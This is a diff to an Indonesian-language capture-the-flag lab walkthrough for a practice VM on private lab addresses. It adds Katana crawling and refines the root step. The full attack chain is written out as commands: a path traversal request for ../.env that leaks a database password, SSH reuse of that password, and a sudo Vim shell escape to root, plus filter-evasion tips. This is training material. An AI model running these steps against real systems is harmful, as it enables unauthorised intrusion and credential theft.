@@ -64,7 +64,7 @@ Recon
 | User SSH | `operator` |
 | Password | nilai `DB_PASSWORD` dari `.env` |
 | User awal | `operator` |
-| Privilege escalation | `sudo /usr/bin/vim` |
+| Privilege escalation | `sudo /usr/bin/vim -c '!sh'` |
 | Pencarian flag | `find / -type f -iname "*flag*" 2>/dev/null` |
 
 ---
@@ -73,14 +73,14 @@ Recon
 
 ```text
 1. Nmap menemukan SSH pada port 22 dan web pada port 8080
-2. Enumerasi aplikasi menemukan fungsi download
+2. Katana atau browser menemukan /download?file=...
 3. Request normal menunjukkan parameter file dikontrol pengguna
 4. Baseline membedakan file valid dan file yang tidak ada
 5. Payload ../.env membaca file di luar direktori dokumen
 6. .env membocorkan username dan password
 7. Credential digunakan untuk SSH sebagai operator
 8. sudo -l menunjukkan operator dapat menjalankan Vim sebagai root
-9. Vim menjalankan /bin/sh melalui shell escape
+9. sudo /usr/bin/vim -c '!sh' membuka shell melalui Vim
 10. Shell berjalan dengan UID 0
 11. Flag dicari dan dibaca
 ```
@@ -119,7 +119,35 @@ nmap -Pn -sC -sV -p22,80,8080 "$TARGET"
 
 # 5. Menemukan Endpoint Download
 
-## 5.1 Enumerasi Direktori
+## 5.1 Crawling dengan Katana
+
+Katana menelusuri tautan aplikasi dan menampilkan URL beserta parameter query. Jalankan dari mesin penguji:
+
+```bash
+katana -u "$WEB"
+```
+
+Pada screenshot praktik, Statute menggunakan IP `192.168.56.136`:
+
+```bash
+katana -u http://192.168.56.136:8080
+```
+
+Cuplikan hasil pada screenshot:
+
+```text
+http://192.168.56.136:8080/download?file=uu-1-2024.pdf
+http://192.168.56.136:8080/document?id=6
+http://192.168.56.136:8080/documents?type=UU
+```
+
+Sesuaikan `TARGET` dan `WEB` dengan IP VM saat praktik; contoh utama dokumen ini menggunakan `192.168.56.120`. Fokuskan langkah berikutnya pada `/download?file=uu-1-2024.pdf`: parameter `file` menerima nama file dan dapat digunakan sebagai request normal pada bagian 6. Endpoint `/document?id=6` adalah halaman detail dokumen yang berbeda dari endpoint download.
+
+Hasil crawling belum membuktikan Path Traversal. Bandingkan baseline terlebih dahulu, lalu uji `../.env` pada bagian 7.
+
+Referensi: [penggunaan Katana](https://docs.projectdiscovery.io/opensource/katana/running).
+
+## 5.2 Alternatif Enumerasi Direktori
 
 ```bash
 dirsearch \
@@ -143,7 +171,7 @@ feroxbuster \
 /documents
 ```
 
-## 5.2 Identifikasi dari Antarmuka
+## 5.3 Identifikasi dari Antarmuka
 
 Selain directory enumeration, buka aplikasi melalui browser dan periksa:
 
@@ -463,13 +491,17 @@ Gunakan path yang sama persis seperti yang ditampilkan oleh `sudo -l`.
 ## 11.1 Cara Cepat
 
 ```bash
-sudo /usr/bin/vim -c ':!/bin/sh'
+sudo /usr/bin/vim -c '!sh'
 ```
 
-Pada beberapa konfigurasi, command sumber juga dapat ditulis:
+Opsi `-c` menjalankan perintah Vim saat startup. Perintah `!sh` membuka shell melalui fitur shell escape. Tanda kutip tunggal menjaga `!sh` diteruskan utuh ke Vim; tanda `:` tidak diperlukan pada argumen `-c`. Gunakan setelah `sudo -l` menunjukkan izin menjalankan `/usr/bin/vim` sebagai root, seperti `(root) NOPASSWD: /usr/bin/vim` pada screenshot.
+
+Hafalan: **sudo → Vim → -c → '!sh'**. Jangan menghilangkan `-c`: `sudo /usr/bin/vim '!sh'` akan memperlakukan `!sh` sebagai nama file.
+
+Jika `sh` tidak ditemukan melalui `PATH`, gunakan path absolut:
 
 ```bash
-sudo vim -c ':!/bin/sh'
+sudo /usr/bin/vim -c '!/bin/sh'
 ```
 
 ## 11.2 Validasi Shell
@@ -497,7 +529,7 @@ sudo /usr/bin/vim
 Di dalam Vim:
 
 ```vim
-:!/bin/bash
+:!sh
 ```
 
 Validasi:
@@ -545,6 +577,8 @@ sudo menjalankan Vim sebagai root
 
 Izin sudo terhadap aplikasi interaktif yang mendukung shell escape pada dasarnya setara dengan memberikan shell root.
 
+Referensi: [opsi startup Vim](https://vimhelp.org/starting.txt.html#-c) dan [perintah shell escape](https://vimhelp.org/various.txt.html#:!).
+
 ---
 
 # 12. Pencarian Flag
@@ -590,13 +624,13 @@ uid=0(root)
 | Tahap | Evidence minimum |
 |---|---|
 | Recon | Port `22` dan `8080` terbuka |
-| Endpoint | Request `/download?file=...` |
+| Endpoint | Output Katana dan request `/download?file=...` |
 | Baseline | Respons file valid dan file tidak ada |
 | Traversal | Request `../.env` dan status `200` |
 | Sensitive data | Variabel relevan dari `.env`, dengan password dimasking |
 | SSH foothold | Output `whoami`, `id`, `hostname` |
 | Sudo | Output `sudo -l` |
-| Privesc | Command `sudo /usr/bin/vim ...` |
+| Privesc | Command `sudo /usr/bin/vim -c '!sh'` |
 | Root proof | Output `whoami` dan `id` |
 | Objective | Path flag dan bukti pembacaan sesuai scope |
 
@@ -726,7 +760,7 @@ Risiko keseluruhan lebih tinggi daripada penilaian setiap celah secara terpisah 
 
 | Masalah | Kemungkinan penyebab | Solusi |
 |---|---|---|
-| Tidak menemukan endpoint download | Hanya mengandalkan directory brute force | Klik fitur download dan periksa Burp/DevTools |
+| Tidak menemukan endpoint download | Hanya mengandalkan directory brute force | Jalankan `katana -u "$WEB"`, klik fitur download, dan periksa Burp/DevTools |
 | Tidak tahu nama parameter | Request normal belum dianalisis | Cari `file=`, `path=`, `document=`, atau parameter serupa |
 | `.env` menghasilkan 404 | Kedalaman traversal tidak tepat | Uji `../.env`, lalu `../../.env` secara terbatas |
 | `.env` menghasilkan 403 | Filter request atau WAF | Samakan header browser dan gunakan URL encoding |
@@ -742,11 +776,12 @@ Risiko keseluruhan lebih tinggi daripada penilaian setiap celah secara terpisah 
 
 # 16. Versi Close Book
 
-## 16.1 Set Target
+## 16.1 Set Target dan Temukan Endpoint
 
 ```bash
 TARGET="192.168.56.120"
 WEB="http://192.168.56.120:8080"
+katana -u "$WEB"
 ```
 
 ## 16.2 Ambil `.env`
@@ -803,7 +838,7 @@ Expected:
 ## 16.5 Root
 
 ```bash
-sudo /usr/bin/vim -c ':!/bin/sh'
+sudo /usr/bin/vim -c '!sh'
 ```
 
 Validasi:
@@ -828,6 +863,9 @@ cat /PATH/FLAG
 TARGET="192.168.56.120"
 WEB="http://192.168.56.120:8080"
 
+katana -u "$WEB"
+# Temukan /download?file=... dan periksa request normal sebelum traversal.
+
 curl -s \
   -H 'User-Agent: Mozilla/5.0' \
   "$WEB/download?file=../.env"
@@ -836,7 +874,7 @@ ssh operator@"$TARGET"
 # password dari DB_PASSWORD
 
 sudo -l
-sudo /usr/bin/vim -c ':!/bin/sh'
+sudo /usr/bin/vim -c '!sh'
 
 whoami
 id
@@ -856,7 +894,7 @@ sudo /usr/bin/vim -c ':set shell=/bin/sh' -c ':shell'
 
 ```text
 Nmap 22,8080
-→ temukan /download
+→ Katana → /download?file=...
 → lihat request normal
 → parameter file
 → baseline valid dan invalid
@@ -865,8 +903,7 @@ Nmap 22,8080
 → DB_PASSWORD
 → SSH operator
 → sudo -l
-→ /usr/bin/vim
-→ sudo vim shell escape
+→ sudo /usr/bin/vim -c '!sh'
 → root
 → find flag
 ```
@@ -874,5 +911,5 @@ Nmap 22,8080
 ## Rumus Ingatan
 
 ```text
-DOWNLOAD → ENV → SSH → SUDO → VIM → ROOT
+KATANA → DOWNLOAD → ENV → SSH → SUDO → VIM -c '!sh' → ROOT
 ```
